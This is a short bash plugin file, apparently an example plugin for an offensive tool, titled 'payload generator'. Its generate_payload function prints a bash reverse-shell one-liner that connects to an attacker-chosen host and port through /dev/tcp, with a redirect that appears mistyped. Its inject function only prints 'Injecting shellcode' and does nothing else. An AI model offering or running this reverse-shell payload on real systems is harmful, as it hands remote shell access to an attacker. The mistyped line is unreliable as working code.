PLUGIN_NAME="payload generator"
PLUGIN_AUTHOR="Jox0101011"

function generate_payload() {
	echo "[*] test sucess..."
	echo "bash -i >& /dev/tcp/\$LHOST/\$LPORT 0>$1"
}
function inject() {
	echo "Injecting shellcode"
}
PLUGIN_COMMANDS+=("generate_payload | example build payload plugin")
PLUGIN_COMMANDS+=("inject | example inject payload plugin")
